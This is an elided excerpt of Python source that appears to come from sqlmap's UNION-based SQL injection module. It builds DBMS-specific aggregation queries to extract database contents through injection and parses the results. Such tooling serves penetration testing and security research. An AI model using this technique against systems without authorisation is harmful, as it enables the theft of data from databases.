...
def _oneShotUnionUse(expression, unpack=True, limited=False):
    retVal = hashDBRetrieve(
        "%s%s" % (conf.hexConvert or False, expression), checkConf=True
    )  # as UNION data is stored raw unconverted
    ...
    if retVal is None:
        ...
        if page and kb.chars.start.upper() in page and kb.chars.start not in page:
            singleTimeWarnMessage(
                "results seems to be upper-cased by force. sqlmap will automatically"
                " lower-case them"
            )
        ...
        if retVal is not None:
            ...
            elif kb.nchar and re.search(
                r" AS N(CHAR|VARCHAR)", agent.nullAndCastField(expression)
            ):
                debugMsg = (  # NOTE: in some cases there are "known" incompatibilities between original columns and NCHAR (e.g. http://testphp.vulnweb.com/artists.php?artist=1)
                    "turning off NATIONAL CHARACTER casting"
                )
                singleTimeDebugMessage(debugMsg)
    ...
    def _configUnionChar(char):
        ...
        if conf.uChar is not None:
            kb.uChar = char.replace(
                "[CHAR]",
                conf.uChar if isDigit(conf.uChar) else "'%s'" % conf.uChar.strip("'"),
            )
...
def unionUse(expression, unpack=True, dump=False):
    """This function tests for an UNION SQL injection on the target URL then
    call its subsidiary function to effectively perform an UNION SQL injection
    on the affected URL."""
    ...
    if (
        ...
        and len(expressionFieldsList) > 1
        and "ORDER BY" in expression.upper()
    ):
    ...
    if (
        ...
        if (
            ...
            and not (
                ...
                and FROM_DUMMY_TABLE[DBMS.ORACLE] in expression
            )
            and not re.search(r"\b(MIN|MAX|COUNT)\(", expression)
        ):
            kb.jsonAggMode = True
            if Backend.isDbms(DBMS.MYSQL):
                query = expression.replace(
                    expressionFields,
                    "CONCAT('%s',JSON_ARRAYAGG(CONCAT_WS('%s',%s)),'%s')"
                    % (
                        kb.chars.start,
                        kb.chars.delimiter,
                        expressionFields,
                ...
                query = expression.replace(
                    ...
                    % (
                        kb.chars.start,
                        ("||'%s'||" % kb.chars.delimiter).join(expressionFieldsList),
                        kb.chars.stop,
                    ),
                    1,
                )
                ...
                query = expression.replace(
                    expressionFields,
                    "'%s'||JSON_GROUP_ARRAY(%s)||'%s'"
                    % (
                        kb.chars.start,
                        ("||'%s'||" % kb.chars.delimiter).join(
                            "COALESCE(%s,' ')" % field for field in expressionFieldsList
                        ),
                        kb.chars.stop,
                    ),
                    1,
                ...
                DBMS.PGSQL
            ):  # Note: ARRAY_AGG does CSV alike output, thus enclosing start/end inside each item
                query = expression.replace(
                    expressionFields,
                    "ARRAY_AGG('%s'||%s||'%s')::text"
                    % (
                        kb.chars.start,
                        ("||'%s'||" % kb.chars.delimiter).join(
                            "COALESCE(%s::text,' ')" % field
    ...
    if (
        value is None
        and (
            kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.NEGATIVE
            or kb.forcePartialUnion
            or conf.forcePartial
            or (dump and (conf.limitStart or conf.limitStop))
            or "LIMIT " in expression.upper()
        )
        and " FROM " in expression.upper()
        and (
        ...
        if limitCond:
            ...
            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    ...
                    debugMsg += "%d %s" % (
                        stopLimit,
                        "entries" if stopLimit > 1 else "entry",
                    )
                    logger.debug(debugMsg)

            elif count and (
                not isinstance(count, six.string_types) or not count.isdigit()
            ):
                        ...
                        while kb.threadContinue:
                            ...
                            if output:
                                with kb.locks.value:
                                    if all(
                                        _ in output
                                        for _ in (kb.chars.start, kb.chars.stop)
                                    ):
                                        ...
                                        for index in xrange(
                                            ...
                                            if (
                                                index < len(threadData.shared.buffered)
                                                and threadData.shared.buffered[index][0]
                                                >= num
                                            ):
                                                break
                                ...
                                if (
                                    conf.verbose == 1
                                    and not (
                                        threadData.resumed and kb.suppressResumeInfo
                                    )
                                    and not threadData.shared.showEta
                                    and not kb.bruteMode
                                ):
                                    _ = ",".join(
                                        "'%s'" % _
                                        for _ in (
                                            flattenValue(arrayizeValue(items))
    ...
    if not kb.bruteMode:
        debugMsg = "performed %d quer%s in %.2f seconds" % (
            kb.counters[PAYLOAD.TECHNIQUE.UNION],
            "y" if kb.counters[PAYLOAD.TECHNIQUE.UNION] == 1 else "ies",
            duration,
        )
        logger.debug(debugMsg)
